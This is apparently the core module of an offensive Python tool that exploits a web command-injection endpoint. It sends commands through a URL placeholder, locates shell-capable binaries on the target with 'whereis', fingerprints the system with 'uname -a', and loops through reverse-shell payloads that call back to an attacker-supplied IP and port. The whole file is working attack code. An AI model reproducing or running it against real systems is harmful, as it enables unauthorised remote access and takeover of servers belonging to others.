import urllib.parse

import requests

from data import payloads


def execute(url: str, command: str) -> str:
    if "SHELL" not in url:
        print("Invalid URL. Please make sure the formatting is correct.")
        exit()
    command_string = url.replace("SHELL", command)
    data = requests.get(command_string)
    return data.text


def find_bins(url: str) -> list:
    valid = []
    bins = list(payloads.payloads.keys())
    for bin in bins:
        result = execute(url, f"whereis {bin}").split(" ")
        for path in result:
            if "bin" in path and bin in path:
                valid.append({bin: path})
                print(f"[-] {bin} found at {path}")
    return valid


def reverse_connection(valid_bins: list, url: str, ip: str, port: int):
    print(f"Bins to test: {len(valid_bins)}")
    for bin in valid_bins:
        print(f"[!] Attempting {list(bin.keys())[0]} payloads for path {list(bin.values())[0]}")
        for payload in payloads.payloads[list(bin.keys())[0]]:
            cmd = urllib.parse.quote(
                payload.replace("PATHHERE", list(bin.values())[0]).replace("IPHERE", ip).replace("PORTHERE", str(port))
            )
            print(execute(url, cmd))


def verify(url: str) -> bool:
    data = execute(url, "uname -a")
    return "linux" in data.lower()
